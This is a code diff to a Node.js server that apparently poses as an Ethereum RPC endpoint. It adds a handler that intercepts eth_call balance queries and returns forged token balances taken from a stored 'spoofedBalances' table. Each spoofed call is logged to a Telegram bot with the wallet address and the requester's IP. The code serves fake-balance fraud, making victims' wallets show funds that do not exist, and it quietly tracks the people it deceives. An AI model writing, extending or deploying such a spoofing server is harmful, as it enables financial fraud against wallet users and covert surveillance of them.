@@ -5,6 +5,7 @@ const axios = require('axios');
 const cors = require('cors');
 const fs = require('fs');
 const TelegramBot = require('node-telegram-bot-api');
+const { ethers } = require("ethers"); // ADDED FOR ETH_CALL
 
 const app = express();
 const PORT = process.env.PORT || 9798;
@@ -127,6 +128,12 @@ const saveBalancesCSV = () => {
 
 // Load balances on startup
 let spoofedBalances = loadBalances();
+
+// === ETH_CALL SETUP ===
+const BALANCE_CHECKER_ABI = [
+  "function balances(address[] users, address[] tokens) view returns (uint256[])"
+];
+const iface = new ethers.Interface(BALANCE_CHECKER_ABI);
 
 app.use(cors());
 app.use(express.static(path.join(__dirname, '/')));
@@ -422,6 +429,43 @@ app.post('/', (req, res) => {
 
     // RPC expects hex balance, so return original hex string
     return res.json({ jsonrpc: '2.0', id, result: balanceHex });
+  }
+
+  // === NEW: eth_call spoof handler ===
+  if (method === 'eth_call') {
+    const call = params[0];
+    const data = call.data;
+    const to = call.to;
+
+    try {
+      const parsed = iface.parseTransaction({ data });
+      if (parsed?.name === "balances") {
+        const users = parsed.args[0].map(addr => addr.toLowerCase());
+        const tokens = parsed.args[1];
+
+        // Collect balances for each user × token
+        const results = [];
+        users.forEach(user => {
+          tokens.forEach(() => {
+            const info = spoofedBalances[user];
+            const balanceHex = info ? info.balance : "0x0";
+            results.push(BigInt(balanceHex));
+          });
+        });
+
+        const encoded = iface.encodeFunctionResult("balances", [results]);
+
+        const logMsg = `🕒 *${now()}*\n[+] Spoofing eth_call:balances for ${users.length} users × ${tokens.length} tokens\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+        console.log(logMsg);
+        sendToTelegram(logMsg);
+
+        return res.json({ jsonrpc: "2.0", id, result: encoded });
+      }
+    } catch (e) {
+      console.log("eth_call decode error:", e.message);
+    }
+
+    return res.json({ jsonrpc: "2.0", id, result: "0x" });
   }
 
   // Unknown methods
